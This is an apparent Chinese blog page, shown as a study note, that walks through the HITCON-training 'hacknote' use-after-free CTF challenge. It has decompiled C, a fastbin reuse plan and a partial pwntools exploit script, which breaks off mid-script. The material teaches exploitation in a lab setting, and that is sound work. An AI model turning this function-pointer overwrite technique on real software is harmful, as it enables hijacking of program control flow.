@@ -1,0 +1,647 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>hacknote -- Use After Free | 喵喵喵喵 | 某鱼唇的人类</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#66CCFF">
+    
+    
+    <meta name="keywords" content="Pwn">
+    <meta name="description" content="根据这个： https:&#x2F;&#x2F;ctf-wiki.github.io&#x2F;ctf-wiki&#x2F;pwn&#x2F;linux&#x2F;glibc-heap&#x2F;use_after_free-zh&#x2F; 原理简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况  内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。 内存块被释放后，其对">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hacknote -- Use After Free">
+<meta property="og:url" content="https://darkwing.moe/2019/07/10/hacknote-Use-After-Free/index.html">
+<meta property="og:site_name" content="喵喵喵喵">
+<meta property="og:description" content="根据这个： https:&#x2F;&#x2F;ctf-wiki.github.io&#x2F;ctf-wiki&#x2F;pwn&#x2F;linux&#x2F;glibc-heap&#x2F;use_after_free-zh&#x2F; 原理简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况  内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。 内存块被释放后，其对">
+<meta property="article:published_time" content="2019-07-10T07:10:07.000Z">
+<meta property="article:modified_time" content="2019-07-10T07:10:50.563Z">
+<meta property="article:author" content="暗羽">
+<meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary">
+    
+        <link rel="alternate" type="application/atom+xml" title="喵喵喵喵" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">暗羽</h5>
+          <a href="mailto:1126955201@qq.com" title="1126955201@qq.com" class="mail">1126955201@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/zjicmDarkWing" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://www.weibo.com/zjicmDarkWing" target="_blank" >
+                <i class="icon icon-lg icon-weibo"></i>
+                Weibo
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://twitter.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-gratipay"></i>
+                网恋选我我超甜
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/links"  >
+                <i class="icon icon-lg icon-link"></i>
+                一些链接
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">hacknote -- Use After Free</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="検索">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">hacknote -- Use After Free</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-07-10T07:10:07.000Z" itemprop="datePublished" class="page-time">
+  2019-07-10
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></li></ul>
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#原理"><span class="post-toc-number">1.</span> <span class="post-toc-text">原理</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#例子"><span class="post-toc-number">2.</span> <span class="post-toc-text">例子</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#功能分析"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">功能分析</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#add-note"><span class="post-toc-number">2.1.1.</span> <span class="post-toc-text">add_note</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#print-note"><span class="post-toc-number">2.1.2.</span> <span class="post-toc-text">print_note</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#del-note"><span class="post-toc-number">2.1.3.</span> <span class="post-toc-text">del_note</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#利用分析"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">利用分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#利用脚本"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">利用脚本</span></a></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-hacknote-Use-After-Free"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">hacknote -- Use After Free</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-07-10 15:10:07" datetime="2019-07-10T07:10:07.000Z"  itemprop="datePublished">2019-07-10</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></li></ul>
+
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>根据这个：</p>
+<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/use_after_free-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/use_after_free-zh/</a></p>
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况</p>
+<ul>
+<li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li>
+<li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</li>
+<li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</li>
+</ul>
+<p>而我们一般所指的 <strong>Use After Free</strong> 漏洞主要是后两种。此外，<strong>我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</strong></p>
+<h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><p>这里我们以 HITCON-training 中的 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote" target="_blank" rel="noopener">lab 10 hacknote</a> 为例。</p>
+<h2 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h2><p>我们可以简单分析下程序，可以看出在程序的开头有个 menu 函数，其中有</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">" 1. Add note          "</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">" 2. Delete note       "</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">" 3. Print note        "</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">" 4. Exit              "</span>);</span><br></pre></td></tr></table></figure>
+
+<p>故而程序应该主要有 3 个功能。之后程序会根据用户的输入执行相应的功能。</p>
+<h3 id="add-note"><a href="#add-note" class="headerlink" title="add_note"></a>add_note</h3><p>根据程序，我们可以看出程序最多可以添加 5 个 note。每个 note 有两个字段 put 与 content，其中 put 会被设置为一个函数，其函数会输出 content 具体的内容。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">add_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  note *v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( count &lt;= <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !notelist[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        notelist[i] = <span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !notelist[i] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Alloca Error"</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        notelist[i]-&gt;put = print_note_content;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Note size :"</span>);</span><br><span class="line">        read(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>);</span><br><span class="line">        size = atoi(&amp;buf);</span><br><span class="line">        v0 = notelist[i];</span><br><span class="line">        v0-&gt;content = <span class="built_in">malloc</span>(size);</span><br><span class="line">        <span class="keyword">if</span> ( !notelist[i]-&gt;content )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Alloca Error"</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Content :"</span>);</span><br><span class="line">        read(<span class="number">0</span>, notelist[i]-&gt;content, size);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Success !"</span>);</span><br><span class="line">        ++count;</span><br><span class="line">        <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Full"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>函数源码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_note</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">  <span class="keyword">int</span> size;</span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">5</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Full"</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!notelist[i]) &#123;</span><br><span class="line">      notelist[i] = (struct note *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct note));</span><br><span class="line">      <span class="keyword">if</span> (!notelist[i]) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Alloca Error"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      notelist[i]-&gt;printnote = print_note_content;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Note size :"</span>);</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">8</span>);</span><br><span class="line">      size = atoi(buf);</span><br><span class="line">      notelist[i]-&gt;content = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(size);</span><br><span class="line">      <span class="keyword">if</span> (!notelist[i]-&gt;content) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Alloca Error"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Content :"</span>);</span><br><span class="line">      read(<span class="number">0</span>, notelist[i]-&gt;content, size);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Success !"</span>);</span><br><span class="line">      count++;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="print-note"><a href="#print-note" class="headerlink" title="print_note"></a>print_note</h3><p>print_note 就是简单的根据给定的 note 的索引来输出对应索引的 note 的内容。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">print_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Out of bound!"</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">    notelist[v1]-&gt;put(notelist[v1]);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>函数源码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_note</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">int</span> idx;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line">  idx = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> (idx &lt; <span class="number">0</span> || idx &gt;= count) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Out of bound!"</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (notelist[idx]) &#123;</span><br><span class="line">    notelist[idx]-&gt;printnote(notelist[idx]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="del-note"><a href="#del-note" class="headerlink" title="del_note"></a>del_note</h3><p>del_note 会根据给定的索引来释放对应的 note。但是值得注意的是，在 删除的时候，只是单纯进行了 free，而没有设置为 NULL，那么显然，这里是存在 Use After Free 的情况的。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">del_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Out of bound!"</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(notelist[v1]-&gt;content);</span><br><span class="line">    <span class="built_in">free</span>(notelist[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Success"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>函数源码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del_note</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">int</span> idx;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line">  idx = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> (idx &lt; <span class="number">0</span> || idx &gt;= count) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Out of bound!"</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (notelist[idx]) &#123;</span><br><span class="line">    <span class="built_in">free</span>(notelist[idx]-&gt;content);</span><br><span class="line">    <span class="built_in">free</span>(notelist[idx]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Success"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><p>我们可以看到 Use After Free 的情况确实可能会发生，那么怎么可以让它发生并且进行利用呢？需要同时注意的是，这个程序中还有一个 magic 函数，我们有没有可能来通过 use after free 来使得这个程序执行 magic 函数呢？<strong>一个很直接的想法是修改 note 的 put 字段为 magic 函数的地址，从而实现在执行 print note 的时候执行 magic 函数。</strong> 那么该怎么执行呢？</p>
+<p>我们可以简单来看一下每一个 note 生成的具体流程</p>
+<ol>
+<li><p>程序申请 8 字节内存用来存放 note 中的 put 以及 content 指针。</p>
+</li>
+<li><p>程序根据输入的 size 来申请指定大小的内存，然后用来存储 content。</p>
+</li>
+</ol>
+   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+-----------------+                       </span><br><span class="line">|   put           |                       </span><br><span class="line">+-----------------+                       </span><br><span class="line">|   content       |       size              </span><br><span class="line">+-----------------+-------------------&gt;+----------------+</span><br><span class="line">                                       |     real       |</span><br><span class="line">                                       |    content     |</span><br><span class="line">                                       |                |</span><br><span class="line">                                       +----------------+</span><br></pre></td></tr></table></figure>
+
+<p>那么，根据我们之前在堆的实现中所学到的，显然 note 是一个 fastbin chunk（大小为 16 字节）。我们的目的是希望一个 note 的 put 字段为 magic 的函数地址，那么我们必须想办法让某个 note 的 put 指针被覆盖为 magic 地址。由于程序中只有唯一的地方对 put 进行赋值。所以我们必须利用写 real content 的时候来进行覆盖。具体采用的思路如下</p>
+<ul>
+<li>申请 note0，real content size 为 16（大小与 note 大小所在的 bin 不一样即可）</li>
+<li>申请 note1，real content size 为 16（大小与 note 大小所在的 bin 不一样即可）</li>
+<li>释放 note0</li>
+<li>释放 note1</li>
+<li>此时，大小为 16 的 fast bin chunk 中链表为 note1-&gt;note0</li>
+<li>申请 note2，并且设置 real content 的大小为 8，那么根据堆的分配规则</li>
+<li>note2 其实会分配 note1 对应的内存块。</li>
+<li>real content 对应的 chunk 其实是 note0。</li>
+<li>如果我们这时候向 note2 real content 的 chunk 部分写入 magic 的地址，那么由于我们没有 note0 为 NULL。当我们再次尝试输出 note0 的时候，程序就会调用 magic 函数。</li>
+</ul>
+<h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./hacknote'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addnote</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span 